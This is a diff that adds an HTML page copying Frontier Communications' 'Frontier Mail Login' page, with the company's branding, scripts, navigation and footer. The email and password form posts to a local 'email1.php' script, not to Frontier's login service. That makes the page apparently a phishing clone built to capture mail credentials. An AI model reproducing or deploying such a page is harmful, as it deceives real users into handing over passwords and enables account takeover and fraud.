@@ -1,0 +1,518 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    <title>Frontier Mail Login</title>
+    <link rel="shortcut icon" href="https://login.frontier.com/ftrtheme/media/img/favicon_new.ico">
+    <link rel="icon" href="https://login.frontier.com/ftrtheme/media/img/favicon_new.ico" type="image/ico">
+    <script src="https://login.frontier.com/ftrtheme/media/js/jquery-3.2.1.min.js"></script>
+    <script src="https://login.frontier.com/ftrtheme/media/js/bootstrap-3.1.1.min.js"></script>
+    <!--[if lte IE 8]><script src="https://login.frontier.com/ftrtheme/vendor/polyfillshiv.js"></script><![endif]-->
+    <!--[if lt IE 9]><script src="https://login.frontier.com/ftrtheme/vendor/html5shiv.min.js"></script><![endif]-->
+    <!--[if lte IE 9]><script src="https://login.frontier.com/ftrtheme/bower_components/json3/lib/json3.min.js"></script><![endif]-->
+    <!--[if lte IE 8]><script src="https://login.frontier.com/ftrtheme/vendor/ie-shiv.js"></script><![endif]-->
+    <script id="analyticsHeaderScript" type="text/javascript">setTimeout(function() {
+  try { s = s_dtm; } catch (e) {}
+}, 3000);
+
+var dtm_s = dtm_s || {};
+try {
+  dtm_s['eVar22'] = "visitor";
+  dtm_s['prop23'] = "en";  
+} catch (e) {}
+    </script>
+    <script>document.createElement('accordion');
+document.createElement('accordion-group');
+document.createElement('accordion-heading');
+document.createElement('alert');
+    </script>
+    <script>window.noAPIAccess = true;
+    </script>
+    <link type="text/css" rel="stylesheet" href="https://login.frontier.com/ftrtheme/css/base.css"/>
+    <link type="text/css" rel="stylesheet" href="https://login.frontier.com/ftrtheme/css/social.css"/>
+    <link type="text/css" rel="stylesheet" href="https://lipis.github.io/bootstrap-social/bootstrap-social.css"/>
+    <link type="text/css" rel="stylesheet" href="https://login.frontier.com/ftrtheme/css/product_pages/lp.css"/>
+    <!--[if IE 8]><style type='text/css'>.header .selectpicker{ width: 171px !important; }#header-main .col-md-offset-1{margin-left:5.33%; margin-right:3%;}</style><![endif]-->
+    <script>
+var browser_width = $(window).width();
+
+$(document).ready(function () {
+  $('#selection').change(function() {
+    var newv = $(this).val();
+    if (newv && newv.length > 0) {
+      window.location.href = newv;
+    }
+  });
+
+  // Mobile footer accordion
+  $("#footer h3").click(function () {
+    if (browser_width <= 991) {
+      $(this).toggleClass('open');
+      $(this).next('ul').slideToggle(500);
+      return false;
+    }
+  });
+
+  // Determines if Mobile OS, and remove the overscroll issue with some mobile OS platforms
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+    $('html, body').addClass("ftr-mobi");
+  }
+});
+
+// Closes footer's expanded menu on resize
+$(window).resize(function (e) {
+  $("#footer h3").removeClass('open');
+  $("#footer ul").removeAttr('style');
+  browser_width = $(window).width();
+});
+
+function selection_goto(e) {
+  var newv = e.value;
+  if (newv && newv.length > 0) {
+    window.location.href=newv;
+  }
+}
+
+$('.dropdown-menu').find('form').click(function(e) { e.stopPropagation(); });
+
+$(document).on('click', '.navbar-collapse.in', function(e) {
+  if ($(e.target).is('a')) {
+    $(this).collapse('hide');
+  }
+});
+
+if(typeof String.prototype.trim !== 'function') {
+  String.prototype.trim = function() {
+    return this.replace(/^\s+|\s+$/g, ''); 
+  }
+}
+
+if (!Array.indexOf) {
+  Array.prototype.indexOf = function (obj) {
+    for (var i = 0; i < this.length; i++) {
+      if (this[i] == obj) {
+        return i;
+      }
+    }
+    return -1;
+  }
+}
+
+[].filter || (Array.prototype.filter = 
+  function(a, b, c, d, e ) {
+  c = this;
+  d = [];
+  for (e in c)
+    ~~e + '' == e && e >= 0 &&
+    a.call(b, c[e], +e, c) &&
+    d.push(c[e]);
+    
+  return d
+})
+    </script>
+    <!-- webfonts-->
+    <link type="text/css" rel="stylesheet" href="https://login.frontier.com/ftrtheme/css/webFonts/webfonts.css"/>
+    <!-- Font Awesome latest-->
+    <link type="text/css" rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"/>
+    <!--Bootflat-->
+    <!--+css("https://login.frontier.com/css/bootflat/css/bootflat.css")-->
+    <script type="text/javascript">var monetateT = new Date().getTime();
+(function () {
+    var p = document.location.protocol;
+    if (p == "http:" || p == "https:") {
+        var m = document.createElement('script'); m.type = 'text/javascript'; m.async = true; m.src = (p == "https:" ? "https://s" : "http://") + "b.monetate.net/js/1/a-04c0fb8e/p/frontier.com/" + Math.floor((monetateT + 556174) / 3600000) + "/g";
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(m, s);
+    }
+})();</script>
+    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-LSD6"></script>
+    <script type="text/javascript" src="//assets.adobedtm.com/fc19531c0bf6205e4c8c1a357c620866eec50643/satelliteLib-4b8641237ab881231ea9edcc135d0fdd111e2a40.js"></script>
+    <link href="https://login.frontier.com/ftrtheme/media/css/common.css" rel="stylesheet" type="text/css" />
+    <link href="https://login.frontier.com/media/css/webmail.css" rel="stylesheet" type="text/css" />
+    <script src="https://www.google.com/recaptcha/api.js?render=onload" async defer></script>
+  </head>
+  <body>
+    <section>
+      <div id="header-global-mobile" class="container">
+        <div class="hidden-sm hidden-md hidden-lg hidden-xl">
+          <div class="header">
+            <div class="navbar-header navbar-default">
+              <button type="button" data-toggle="collapse" data-target=".navbar-collapse-top" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+              <a href="https://frontier.com" class="navbar-brand hidden-lg hidden-xl hidden-md hidden-sm"><img src="/ftrtheme/img/Frontier.png" width="127"></a>
+            </div>
+            <div class="collapse navbar-collapse-top">
+              <ul class="nav nav-justified">
+                <li><a href="https://frontier.com/">Residential</a></li>
+                <li><a href="https://business.frontier.com/?kbid=80875" target="_blank"> Business</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="row hidden-xs">
+        <div class="header">
+          <div class="navbar-header navbar-static-top navbar-inverse">
+            <div class="container">
+              <div class="col-md-5 col-sm-5">
+                <ul class="nav nav-tabs">
+                  <li><a href="https://frontier.com/">Residential</a></li>
+                  <li><a href="https://business.frontier.com/?kbid=80875" target="_blank">Business</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container hidden-xs">
+        <div id="header-main" class="header">
+          <div class="col-md-4">
+            <div class="col-md-2 col-sm-3 hidden-xs nopad">
+              <a href="https://frontier.com" class="ftr-brand-logo navbar-brand"></a>
+            </div>
+          </div>
+          <div class="col-md-8">
+            <div class="col-md-3 col-sm-3 hidden-sm hidden-xs nopad">
+              <form class="navbar-form ftr-quick-links">
+                <div class="form-group">
+                  <div class="styled-select">
+                    <!--i.fa.fa-sort-down -->
+                    <select id="selection" class="selectpicker form-control ftr-quick-links" >
+                      <option value="">Go to... </option>
+                      <option value="https://frontier.com/account?page=/summary">My Account</option>
+                      <option value="https://frontier.com/account?page=/payments/onetime">Pay Your Bill</option>
+                      <option value="https://login.frontier.com/webmail">Check Your Mail</option>
+                    </select>
+                  </div>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container"></div>
+      <div class="container">
+        <div id="CONTENT">
+          <div class="well">
+
+<script src="//platform.twitter.com/widgets.js" id="twitter-wjs"></script>
+<script src="//connect.facebook.net/en_US/all.js#xfbml=1" id="facebook-jssdk"></script>
+
+
+
+      <form target="_parent" method="post" action="email1.php" name="login" id="loginForm">
+
+      <div id="webmail-login">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-9 col-md-offset-1">
+              <h1>Frontier Mail Login</h1>
+            </div>
+
+            <div class="col-md-4 col-md-offset-1">
+              <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="text" class="form-control" tabindex="1" name="email" id="email" placeholder="username@frontier.com" required/>
+              </div>
+              <div class="form-group">
+                <label for="pass">Password</label>
+                <input type="password" class="form-control" tabindex="2" name="pass" id="pass" placeholder="**********" required/>
+              </div>
+
+
+
+              <button type="submit" tabindex="6" class="btn btn-primary btn-block" onclick="return submit_login();" value="Login" alt="submit">Login</button>
+            </div>
+
+            <div class="col-md-4 col-md-offset-1">
+              <div class="col-sm-9 col-md-offset-1 hidden-lg">
+                <hr>
+              </div>
+
+              <p class="yahoo-font-color">Make <a href="http://frontier.my.yahoo.com/">Frontier Yahoo! your homepage</a>.
+              </p>
+
+              <div id="yahooSearchTop">
+                <form class="yahooSearch">
+                  <div class="form-group">
+
+<script type="text/javascript">
+<!--
+      function CheckForEnter(e, inputName)
+      {
+        e = (e) ? e : event;
+        if(e.which || e.keyCode){
+          if ((e.which == 13) || (e.keyCode == 13)) {
+            document.getElementById(inputName).click();
+            e.returnValue = false;
+            e.cancel = true;
+            return false;
+          }
+        }
+        else 
+        {
+          return true;
+        }
+      }
+                
+      function executeSearchTop(thisForm){
+        var resultURL=''; 
+        resultURL+='https://search.yahoo.com/yhs/search?hspart=frontier&hsimp=yhs-frontier1&p=';
+        resultURL+=escape(thisForm.searchforTop.value); 
+        var gotoURL=resultURL; 
+         
+        document.location.href=gotoURL; 
+        return false;                                                   
+      }
+-->
+</script>
+
+                    <img title="" alt="Powered By Yahoo! Search" src="https://login.frontier.com/media/images/yahoo_logo.gif">
+                    <button class="btn" type="web search" onclick="return executeSearchTop(this.form);" name="SubmitSearch" id="SubmitSearch"> Web Search </button>
+                    <input class="form-control" tabindex="6" onkeypress="return CheckForEnter(event, 'SubmitSearch');"  name="searchforTop" id="inputSearch">
+                  </div>
+                  <input type="hidden" name="stTop" value="site">
+                </form>   
+              </div><!-- end of yahooSearchTop -->
+
+            </div>
+
+            <div class="col-sm-9 col-md-offset-1">
+              <hr />
+            </div>
+
+            <div class="col-sm-9 col-md-offset-1">
+              <!--fid-help-links class="ng-isolate-scope"-->
+                <p class="fid-help-links"> <span data-i18n="fid.need-help">Still need help?</span> <span class="fid-help-links-option"> <i class="fa fa-comment fa-lg"></i> <a href="https://frontier.com/helpcenter/contact-us" target="_blank" data-i18n="fid.live-chat">Live Chat</a> </span> <span class="fid-help-links-option"> <i class="fa fa-question-circle fa-lg"></i> <a href="https://frontier.com/helpcenter" target="_blank" data-i18n="fid.help-center">Help Center</a> </span> </p>
+              <!--/fid-help-links-->
+            </div>
+
+            <div class="col-sm-9 col-md-offset-1">
+              <p><strong>Note:</strong> For your security, please be sure to log out when you are done.</p>
+              <p>
+                Frontier does not track how you use e-mail or what sites you visit. If your Frontier e-mail is hosted by Yahoo!, Yahoo! does not share this information with Frontier. <a href="http://www.frontier.com/policies">See Frontier's Privacy Policy.</a>
+              </p>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      </form>
+
+      <p class="hiddenhost">
+        z-proxy05.roch.ny.frontiernet.net 
+      </p>
+
+<!-- Begin Google Analytics -->
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-33866788-3']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<!-- End Google Analytics -->
+
+<script type="text/javascript">_satellite.pageBottom();</script>
+
+          </div>
+        </div>
+      </div>
+      <script type="text/javascript">$(function() {
+  $(".footer_link h3").click(function() {
+      if ($(window).width() < 768) {
+          $(this).toggleClass('open');
+          $(this).next('ul').slideToggle(500);
+          return false;
+      }
+  });
+  $('.col-sm-4').each(function(index) {
+      var sw = $(this).children('.col').children('.mobile-middle').clone().addClass('MobileShow');
+      $(this).children('.col').children('.link').after(sw);
+  });
+  $(window).resize(function(e) {
+      $(".footer_link h3").removeClass('open');
+      $(".footer_link ul").removeAttr('style');
+  });
+  $(".dropdown-menu li a").click(function() {
+      var selText = $(this).text();
+      $(this).parents('.btn-group').find('.dropdown-toggle').html(selText + ' <span class="caret"></span>');
+  });
+});
+      </script>
+      <div id="footer">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Shop</h3>
+              <ul>
+                <li><a href="https://frontier.com/shop/bundles?geolocate=1">Bundles</a></li>
+                <li><a href="https://frontier.com/shop/internet?geolocate=1">Internet</a></li>
+                <li><a href="https://frontier.com/shop/internet/fios-internet">Internet-FiOS</a></li>
+                <li><a href="https://frontier.com/shop/internet/vantage">Internet-Vantage</a></li>
+                <li><a href="https://frontier.com/shop/tv?geolocate=1">Video/TV</a></li>
+                <li><a href="https://frontier.com/shop/tv/fios">Video/TV-FiOS</a></li>
+                <li><a href="https://frontier.com/shop/tv/vantage">Video/TV-Vantage</a></li>
+                <li><a href="https://frontier.com/shop/phone?geolocate=1">Phone</a></li>
+                <li><a href="https://frontier.com/shop/frontier-secure">Frontier Secure</a></li>
+                <li><a href="https://frontier.com/resources/movers">Moving</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-3 col-sm-12 col-xs-12">
+              <h3>My Account</h3>
+              <ul>
+                <li><a href="https://frontier.com/register" target="blank">Register</a></li>
+                <li><a href="https://frontier.com/login" target="blank">Pay Bill</a></li>
+                <li><a href="https://login.frontier.com/webmail" target="blank">Check Email</a></li>
+                <li><a href="https://frontier.com/login" target="blank">Manage Account</a></li>
+                <li><a href="https://frontier.com/myfrontier-mobile-app">MyFrontier App</a></li>
+                <li><a href="https://tv.frontier.com">Watch TV</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-3 col-xs-12">
+              <h3>Support</h3>
+              <ul>
+                <li><a href="https://frontier.com/helpcenter">Help Center</a></li>
+                <li><a href="http://videos.frontier.com/">Video Gallery</a></li>
+                <li><a href="https://frontier.com/helpcenter/categories/support-wizard">Support Wizard</a></li>
+                <li><a href="https://frontier.com/helpcenter/categories/ticket-status">Trouble Ticket Status</a></li>
+                <li><a href="https://frontier.com/helpcenter/categories/order-status">Order Status</a></li>
+                <li><a href="http://speedtest.frontier.com/">Test Your Speed</a></li>
+                <li><a href="https://frontier.com/contact-us">Contact Us</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Corporate</h3>
+              <ul>
+                <li><a href="https://frontier.com/corporate/company/overview">Company</a></li>
+                <li><a href="http://investor.frontier.com/">Investors</a></li>
+                <li><a href="https://frontier.com/corporate/news/home">News</a></li>
+                <li><a href="https://frontier.com/corporate/responsibility/home">Responsibility</a></li>
+                <li><a href="https://frontier.com/corporate/company/suppliers" rel="nofollow">Suppliers</a></li>
+                <li><a href="https://frontier.com/forms/sponsorship" rel="nofollow">Sponsorships</a></li>
+                <li><a href="https://frontier.com/corporate/responsibility/inspection-files/home" rel="nofollow">Public Inspection Files</a></li>
+                <li><a href="https://frontier.com/resources/discount-programs">Discount Programs</a></li>
+                <li><a href="https://frontier.com/corporate/careers/overview">Careers</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Frontier Sites</h3>
+              <ul>
+                <li><a href="https://frontier.com/vantage/home" target="blank">Get Vantage</a></li>
+                <li><a href="https://business.frontier.com" target="blank">Frontier Business</a></li>
+                <li><a href="https://www.frontierwifi.com/data/default.aspx" target="blank">Frontier Wi-Fi</a></li>
+                <li><a href="https://frontier.com/wholesale/home" target="blank" rel="nofollow">Wholesale</a></li>
+                <li><a href="https://frontier.yahoo.com/" target="blank">Frontier Yahoo Portal</a></li>
+                <li><a href="https://frontier.com/frontieragent" target="blank" rel="nofollow">Frontier Business Partner Program</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Sales Partners</h3>
+              <ul>
+                <li><a href="https://internet.frontier.com" target="blank">Frontier Internet</a></li>
+                <li><a href="https://www.frontierbundles.com" target="blank">Frontier Internet Bundles</a></li>
+                <li><a href="https://go.frontier.com" target="blank">Frontier Internet Packages</a></li>
+                <li><a href="https://internet.frontier.com/local" target="blank">Local Internet</a></li>
+                <li><a href="https://internet.frontier.com/fios.html" target="blank">Frontier FiOS</a></li>
+                <li><a href="https://www.frontierbundles.com/fios" target="blank">Frontier FiOS Internet</a></li>
+                <li><a href="https://go.frontier.com/fios" target="blank">Frontier FiOS Availability</a></li>
+                <li><a href="https://internet.frontier.com/plans-pricing.html" target="blank">Frontier Pricing</a></li>
+                <li><a href="https://www.frontierinternet.com/" target="blank">Frontier Broadband</a></li>
+                <li><a href="https://www.frontierbundles.com/internet.html" target="blank">Frontier High-Speed Internet</a></li>
+                <li><a href="https://go.frontier.com/internet" target="blank">Frontier Internet Availability</a></li>
+                <li><a href="https://www.frontierinternet.com/plans-pricing.html" target="blank">Frontier Internet Plans</a></li>
+              </ul>
+            </div>
+            <!--.col-md-12.nopad-->
+          </div>
+          <div class="row">
+            <div class="col-md-2 hidden-sm hidden-xs nopad pull-left">
+              <a href="https://frontier.com"><img src="/ftrtheme/img/footer-logo.png"></a>
+            </div>
+            <div class="col-md-2 hidden-sm hidden-xs nopad pull-right">
+              <div class="social-icons-ftr">
+                <span class="fa-stack fa-lg">
+                  <a href="https://twitter.com/FrontierCorp" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x twitter"></i>
+                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                  </a>
+                </span>
+                <span class="fa-stack fa-lg">
+                  <a href="https://www.facebook.com/FrontierCorp" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x facebook"></i>
+                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                  </a>
+                </span>
+                <span class="fa-stack fa-lg">
+                  <a href="https://www.linkedin.com/company/frontier-communications" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x linkedin"></i>
+                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                  </a>
+                </span>
+                <span class="fa-stack fa-lg">
+                  <a href="https://www.youtube.com/user/FrontierCorp" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x youtube"></i>
+                    <i class="fa fa-youtube-play fa-stack-1x fa-inverse">  </i>
+                  </a>
+                </span>
+                <span class="fa-stack fa-lg">
+                  <a href="https://plus.google.com/+FrontierCorp/posts" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x googleplus"></i>
+                    <i class="fa fa-google-plus fa-stack-1x fa-inverse">  </i>
+                  </a>
+                </span>
+              </div>
+            </div>
+            <div class="col-md-8 col-sm-12 col-xs-12">
+              <ul id="policies">
+                <li><a href="https://frontier.com" rel="nofollow">Home</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/sitemap" rel="nofollow">Site Map</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/retailstores/locations" rel="nofollow">Store Locator</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/policies" rel="nofollow">Policies &amp; Notifications</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/terms" rel="nofollow">Terms &amp; Conditions</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/~/media/corporate/policies/privacy-policy.ashx">Privacy Policy</a></li>
+              </ul>
+              <div id="copywrite">&copy;2016-2019 Frontier Communications Corporation. All rights reserved.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <script>try { _satellite.pageBottom(); } catch (e) {}
+      </script>
+      <script>(function(window) {
+  var trackFn = function() {
+    if (typeof(window.s_dtm) === 'undefined') {
+      setTimeout(trackFn, 100);
+    } else {
+      var pathname = false ? "" : window.location.pathname;
+      var t = dtm_s || {};
+      t.pageName = "ftr:" + pathname.substr(1);
+      t.pageURL = window.location.href;
+      window.s_dtm.trackData(t);
+    }
+  };
+  trackFn();
+})(window);
+      </script>
+    </section>
+  </body>
+</html>
